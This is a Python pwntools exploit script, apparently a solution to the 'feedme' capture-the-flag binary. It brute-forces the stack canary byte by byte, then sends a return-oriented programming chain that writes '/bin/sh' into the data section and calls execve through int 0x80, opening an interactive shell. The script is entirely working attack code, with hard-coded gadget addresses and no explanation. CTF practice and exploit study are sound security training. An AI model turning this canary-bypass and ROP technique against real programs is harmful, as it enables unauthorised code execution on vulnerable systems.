#!/usr/bin/python3
import pwn
import sys
binary = "feedme"
pwn.context.binary = binary
pwn.context.encoding = "latin"
pwn.context.kernel = "i386"
pwn.context.update(arch='i386', os='linux')

packer = pwn.make_packer(8, endian="little", sign="unsigned")

execve_eax = 11
execve_ebx = 0x80ea060 
execve_ecx = 0
execve_edx = 0

gadgets = {
    "data_section": 0x80ea060,
    "mov_eax_edx": 0x0807be31,
    "pop_eax": 0x080bb496,
    "pop_edx": 0x0806f34a,
    "pop_ecx_ebx": 0x0806f371,
    "int_80": 0x08049761,
    "ret": 0x080481b2
}

gdbscript = ""
with open("breakpoints.gdb", "r") as io:
    gdbscript = io.read()

def brute_force_canary(io):
    canary = b""
    padding = b"A"*32
    for i in range(4):
        for x in range(256):
            payload = padding + canary + packer(x) 
            io.send(packer(len(payload)))
            io.send(payload)
            output = io.recvuntil("exit.")
            if b"stack smashing" not in output:
                print("guess successful")
                canary += packer(x)
                break
    return canary

if "log" in sys.argv:
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    bin = pwn.ELF(binary)

    canary = brute_force_canary(io)
    padding_canary = 32
    padding_after_canary = 12
    payload = pwn.flat(
        b"B"*padding_canary,
        canary,
        b"A"*padding_after_canary,
        pwn.p32(gadgets["pop_eax"]),
        gadgets["data_section"],
        pwn.p32(gadgets["pop_edx"]),
        b"/bin",
        pwn.p32(gadgets["mov_eax_edx"]),
        pwn.p32(gadgets["pop_eax"]),
        gadgets["data_section"]+4,
        pwn.p32(gadgets["pop_edx"]),
        0x0068732f,
        pwn.p32(gadgets["mov_eax_edx"]),
        pwn.p32(gadgets["pop_eax"]),
        execve_eax,
        pwn.p32(gadgets["pop_ecx_ebx"]),
        execve_ecx,
        execve_ebx,
        pwn.p32(gadgets["pop_edx"]),
        execve_edx,
        pwn.p32(gadgets["int_80"])
    )
    print(f"{canary.hex()=}")
    io.send(packer(len(payload)))
    io.send(payload)
    io.interactive()